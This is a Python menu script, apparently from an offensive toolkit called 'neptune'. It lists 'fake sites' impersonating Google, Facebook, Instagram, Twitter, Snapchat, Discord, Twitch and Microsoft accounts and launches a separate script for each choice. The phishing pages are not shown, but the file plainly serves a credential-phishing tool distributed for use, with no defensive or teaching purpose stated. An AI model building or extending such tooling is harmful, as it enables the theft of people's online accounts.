

#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
#    ------------------------------------------------------------------------------------------------


from Config.Config import *
from Config.Util import *


try:
   import webbrowser
   import re
   
   from tkinter import messagebox
except Exception as e:
   ErrorModule(e)

#soon options

option_soon = "BIENTOT..."
option_soon_txt = f"{blue}[{white}{blue}]{white}" + option_soon.ljust(30)[:30].replace("_", " ")


#options



option_01 = "Google_accounts"
option_02 = "Facebook_accounts"
option_03 = "Instagram_accounts"
option_04 = "Twitter_accounts"
option_05 = "Snapchat_accounts"
option_06 = "discord_accounts"
option_07 = "Twitch_accounts"
option_08 = "microsoft_accounts"


option_01_txt = f"{blue}[{white}01{blue}]{white}" + option_01.ljust(30)[:30].replace("_", " ")
option_02_txt = f"{blue}[{white}02{blue}]{white}" + option_02.ljust(30)[:30].replace("_", " ")
option_03_txt = f"{blue}[{white}03{blue}]{white}" + option_03.ljust(30)[:30].replace("_", " ")
option_04_txt = f"{blue}[{white}04{blue}]{white}" + option_04.ljust(30)[:30].replace("_", " ")
option_05_txt = f"{blue}[{white}05{blue}]{white}" + option_05.ljust(30)[:30].replace("_", " ")
option_06_txt = f"{blue}[{white}06{blue}]{white}" + option_06.ljust(30)[:30].replace("_", " ")
option_07_txt = f"{blue}[{white}07{blue}]{white}" + option_07.ljust(30)[:30].replace("_", " ")
option_08_txt = f"{blue}[{white}08{blue}]{white}" + option_08.ljust(30)[:30].replace("_", " ")


fake_sites_menu1 = f"""   {blue} SOON {reset}
┌───────────────┐                        ┌───────┐                           ┌────────┐       
      └─┬─────────┤     GAFAM     ├─────────┬──────────────┤ APPLI ├──────────────┬────────────┤ AUTRES ├───────
       │          └───────────────┘         │              └───────┘              │            └────────┘
       ├─ {option_01_txt                    }├─ {option_02_txt                    }├─ {option_07_txt}
       ├─ {option_02_txt                    }├─ {option_03_txt                    }├─ {option_soon_txt}
       ├─ {option_03_txt                    }├─ {option_04_txt                    }├─ {option_soon_txt}
       ├─ {option_04_txt                    }├─ {option_05_txt                    }├─ {option_soon_txt}
       ├─ {option_05_txt                    }├─ {option_soon_txt                  }├─ {option_soon_txt}
       ├─ {option_06_txt                    }├─ {option_soon_txt                  }├─ {option_soon_txt}
       └─ {option_07_txt                    }├─ {option_soon_txt                  }└─ {option_soon_txt}
                                             ├─ {option_soon_txt                  }
                                             ├─ {option_soon_txt                  }
                                             └─ {option_soon_txt                  }
"""
fake_sites_menu_path = os.path.join(tool_path,  "Config", "fake_sites_menu.txt")

def fake_sites_menu():
   try:
      with open(fake_sites_menu_path, "r") as file:
         fake_sites_menu_number = file.read().strip()
      fake_sites_menu_mapping = {"1": fake_sites_menu1}
      fake_sites_menu = fake_sites_menu_mapping.get(fake_sites_menu_number, fake_sites_menu1)
   except:
      fake_sites_menu_number = "1"
      fake_sites_menu = fake_sites_menu1
   
   return fake_sites_menu, fake_sites_menu_number


while True:
   try:
     

      banner, fake_sites_menu_number = fake_sites_menu()

      Title(f"fake_sites_menu {fake_sites_menu_number}")
      Slow(MainColor(banner))

      choice = input(MainColor(f""" ┌──({white}{username_pc}@neptune)─{blue}[{white}~/{os_name}/fake_sites_menu-{fake_sites_menu_number}]
 └─{white}$ {reset}"""))

   
      

      options = {
         '01': option_01, '02': option_02, '03': option_03, '04': option_04,
         '05': option_05, '06': option_06, '07': option_07, '08': option_08,
        
      }

      if choice in options:  
         StartProgram(f"{options[choice]}.py")
      elif '0' + choice in options:
         StartProgram(f"{options['0' + choice]}.py")
      else:
         ErrorChoiceStart()

   except Exception as e:
      Error(e)